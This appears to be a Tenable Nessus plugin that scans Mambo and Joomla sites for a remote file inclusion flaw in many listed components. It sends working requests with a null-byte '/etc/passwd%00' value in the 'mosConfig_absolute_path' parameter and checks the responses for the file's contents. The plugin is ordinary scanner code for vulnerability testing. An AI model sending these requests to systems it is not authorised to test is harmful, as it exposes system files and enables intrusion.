#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22049);
  script_version("$Revision: 1.81 $");

  if (NASL_LEVEL >= 3004)
  {
  script_cve_id(
    "CVE-2006-3396",
    "CVE-2006-3530",
    "CVE-2006-3556",
    "CVE-2006-3748",
    "CVE-2006-3749",
    "CVE-2006-3750",
    "CVE-2006-3751",
    "CVE-2006-3773",
    "CVE-2006-3774",
    "CVE-2006-3846",
    "CVE-2006-3947",
    "CVE-2006-3949",
    "CVE-2006-3980",
    "CVE-2006-3995",
    "CVE-2006-4074",
    "CVE-2006-4130",
    "CVE-2006-4195",
    "CVE-2006-4270",
    "CVE-2006-4288",
    "CVE-2006-4553",
    "CVE-2006-4858",
    "CVE-2006-5045",
    "CVE-2006-5048",
    "CVE-2006-5519",
    "CVE-2006-6962",
    "CVE-2007-1702",
    "CVE-2007-2005",
    "CVE-2007-2144",
    "CVE-2007-2319",
    "CVE-2007-3130",
    "CVE-2007-5310",
    "CVE-2007-5412",
    "CVE-2007-5457",
    "CVE-2008-0567",
    "CVE-2008-5789",
    "CVE-2008-5790",
    "CVE-2008-5793",
    "CVE-2008-6841"
  );
    script_bugtraq_id(
      18705, 
      18808, 
      18876, 
      18919, 
      18924, 
      18968, 
      18991, 
      19037, 
      19042, 
      19044, 
      19047, 
      19100, 
      19217, 
      19222, 
      19223, 
      19224, 
      19233, 
      19373, 
      19465, 
      19505, 
      19574, 
      19581, 
      19725, 
      20018, 
      20667, 
      23125, 
      23408, 
      23490,
      23529,
      24342,
      25959,
      26002,
      26044,
      27531,
      28942,
      30093,
      32190,
      32192,
      32194
    );
    script_xref(name:"OSVDB", value:"27010");
    script_xref(name:"OSVDB", value:"27653");
    script_xref(name:"OSVDB", value:"27650");
    script_xref(name:"OSVDB", value:"27651");
    script_xref(name:"OSVDB", value:"27652");
    script_xref(name:"OSVDB", value:"27656");
    script_xref(name:"OSVDB", value:"27991");
    script_xref(name:"OSVDB", value:"28111");
    script_xref(name:"OSVDB", value:"28112");
    script_xref(name:"OSVDB", value:"28113");
    script_xref(name:"OSVDB", value:"28241");
    script_xref(name:"OSVDB", value:"34795");
    script_xref(name:"OSVDB", value:"34796");
    script_xref(name:"OSVDB", value:"34797");
    script_xref(name:"OSVDB", value:"34798");
    script_xref(name:"OSVDB", value:"34799");
    script_xref(name:"OSVDB", value:"34800");
    script_xref(name:"OSVDB", value:"34801");
  }

  script_name(english:"Mambo / Joomla Component / Module mosConfig_absolute_path Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using Mambo / Joomla components and modules");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains at least one a PHP script that is prone
to remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host contains a third-party Mambo / Joomla component or
module. 

The version of at least one such component or module installed on the
remote host fails to sanitize input to the 'mosConfig_absolute_path'
parameter before using it to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these flaws to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439035/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439451/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439618/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439963/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439997/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/440881/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/441533/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/441538/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/441541/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/444425/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://packetstormsecurity.org/0607-exploits/smf.txt" );
 script_set_attribute(attribute:"see_also", value:"http://isc.sans.org/diary.php?storyid=1526" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/1959" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2020" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2023" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2029" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2083" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2089" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2125" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2196" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2205" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2206" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2207" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2214" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2367" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2613" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/3567" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/3703" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/3753" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4497" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4507" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4521" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/5020" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/5497" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/6003" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/7038" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/7039" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/7040" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting or contact the product's
author to see if an upgrade exists." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Vulnerable scripts.
# - components.
ncoms = 0;
com = make_array();
# -   A6MamboCredits
com[ncoms++] = "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php";
# -   Art*Links
com[ncoms++] = "/components/com_artlinks/artlinks.dispnew.php";
# -   Chrono Forms
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/PPS/File.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/PPS.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php";
# -   Clickheat
com[ncoms++] = "/administrator/components/com_clickheat/install.clickheat.php";
com[ncoms++] = "/administrator/components/com_clickheat/includes/heatmap/_main.php";
com[ncoms++] = "/administrator/components/com_clickheat/includes/heatmap/main.php";
com[ncoms++] = "/administrator/components/com_clickheat/includes/overview/main.php";
com[ncoms++] = "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php";
com[ncoms++] = "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php";
com[ncoms++] = "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php";
# -   Community Builder
com[ncoms++] = "/administrator/components/com_comprofiler/plugin.class.php";
# -   Coppermine Photo Gallery
com[ncoms++] = "/components/com_cpg/cpg.php";
# -   DBQ Manager
com[ncoms++] = "/administrator/components/com_dbquery/classes/DBQ/admin/common.class.php";
# -   ExtCalendar
com[ncoms++] = "/components/com_extcalendar/extcalendar.php";
# -   Feederator
com[ncoms++] = "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php";
com[ncoms++] = "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php";
com[ncoms++] = "/administrator/components/com_feederator/includes/tmsp/subscription.php";
com[ncoms++] = "/administrator/components/com_feederator/includes/tmsp/tmsp.php";
# -   Galleria
com[ncoms++] = "/components/com_galleria/galleria.html.php";
# -   Hashcash
com[ncoms++] = "/components/com_hashcash/server.php";
# -   HTMLArea3
com[ncoms++] = "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php";
# -   JD-Wiki
com[ncoms++] = "/components/com_jd-wiki/lib/tpl/default/main.php";
com[ncoms++] = "/components/com_jd-wiki/bin/dwpage.php";
com[ncoms++] = "/components/com_jd-wiki/bin/wantedpages.php";
# -    Joomla Flash Uploader
com[ncoms++] = "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php";
com[ncoms++] = "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php";
# -   JoomlaPack
com[ncoms++] = "/administrator/components/com_jpack/includes/CAltInstaller.php";
# -   Joomla-Visites
com[ncoms++] = "/administrator/components/com_joomla-visites/core/include/myMailer.class.php";
# -   Link Directory
com[ncoms++] = "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php";
# -   LoudMouth
com[ncoms++] = "/components/com_loudmouth/includes/abbc/abbc.class.php";
# -   Mambatstaff
com[ncoms++] = "/components/com_mambatstaff/mambatstaff.php";
# -   MambelFish
com[ncoms++] = "/administrator/components/com_mambelfish/mambelfish.class.php";
# -   Mambo Gallery Manager
com[ncoms++] = "/administrator/components/com_mgm/help.mgm.php";
# -   Mosets Tree
com[ncoms++] = "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php";
# -  mp3_allopass
com[ncoms++] = "/components/com_mp3_allopass/allopass.php";
com[ncoms++] = "/components/com_mp3_allopass/allopass-error.php";
# -   Multibanners
com[ncoms++] = "/administrator/components/com_multibanners/extadminmenus.class.php";
# -   PCCookbook
com[ncoms++] = "/components/com_pccookbook/pccookbook.php";
# -   Peoplebook
com[ncoms++] = "/administrator/components/com_peoplebook/param.peoplebook.php";
# -   perForms
com[ncoms++] = "/components/com_performs/performs.php";
# -   phpShop
com[ncoms++] = "/administrator/components/com_phpshop/toolbar.phpshop.html.php";
# -   PollXT
com[ncoms++] = "/administrator/components/com_pollxt/conf.pollxt.php";
# -   Recly!Competitions
com[ncoms++] = "/administrator/components/com_competitions/includes/competitions/add.php";
com[ncoms++] = "/administrator/components/com_competitions/includes/competitions/competitions.php";
com[ncoms++] = "/administrator/components/com_competitions/includes/settings/settings.php";
# -   Remository
com[ncoms++] = "/administrator/components/com_remository/admin.remository.php";
# -   rsGallery
com[ncoms++] = "/components/com_rsgallery2/rsgallery2.php";
com[ncoms++] = "/components/com_rsgallery2/rsgallery2.html.php";
# -   Security Images
com[ncoms++] = "/administrator/components/com_securityimages/configinsert.php";
com[ncoms++] = "/administrator/components/com_securityimages/lang.php";
# -   Serverstat
com[ncoms++] = "/administrator/components/com_serverstat/install.serverstat.php";
# -   SiteMap
com[ncoms++] = "/components/com_sitemap/sitemap.xml.php";
# -   SMF Forum
com[ncoms++] = "/components/com_smf/smf.php";
# -   Taskhopper
com[ncoms++] = "/components/com_thopper/inc/contact_type.php";
com[ncoms++] = "/components/com_thopper/inc/itemstatus_type.php";
com[ncoms++] = "/components/com_thopper/inc/projectstatus_type.php";
com[ncoms++] = "/components/com_thopper/inc/request_type.php";
com[ncoms++] = "/components/com_thopper/inc/responses_type.php";
com[ncoms++] = "/components/com_thopper/inc/timelog_type.php";
com[ncoms++] = "/components/com_thopper/inc/urgency_type.php";
# -   User Home Pages
com[ncoms++] = "/administrator/components/com_uhp/uhp_config.php";
com[ncoms++] = "/administrator/components/com_uhp2/footer.php";
# -   VideoDB
com[ncoms++] = "/administrator/components/com_videodb/core/videodb.class.xml.php";
# -    WmT Portfolio
com[ncoms++] = "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php";
# - modules.
nmods = 0;
mod = make_array();
# -   Autostand
mod[nmods++] = "/mod_as_category.php";
mod[nmods++] = "/mod_as_category/mod_as_category.php";
# -   FlatMenu
mod[nmods++] = "/mod_flatmenu.php";
# -   MambWeather
mod[nmods++] = "/MambWeather/Savant2/Savant2_Plugin_options.php";


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
info = "";
contents = "";
foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  for (i=0; i<ncoms; i++)
  {
    req = http_get(
      item:string(
        dir, com[i], "?",
        "mosConfig_absolute_path=", file
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + com[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = strstr(res, '\r\n\r\n') - '\r\n\r\n';
        if ("<br" >< contents) contents = contents - strstr(contents, "<br");
      }

      if (!thorough_tests) break;
    }
  }
  if (info && !thorough_tests) break;

  for (i=0; i<nmods; i++)
  {
    req = http_get(
      item:string(
        dir, "/modules/", mod[i], "?",
        "mosConfig_absolute_path=", file
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + "/modules/" + mod[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = strstr(res, '\r\n\r\n') - '\r\n\r\n';
        if ("<br" >< contents) contents = contents - strstr(contents, "<br");
      }

      if (!thorough_tests) break;
    }
  }
  if (info && !thorough_tests) break;
}

if (info)
{
  if (report_verbosity)
  {
    if (contents)
      info = string(
        info,
        "\n",
        "And here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );

    report = string(
      "\n",
      "The following script(s) are vulnerable :\n",
      "\n",
      info
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
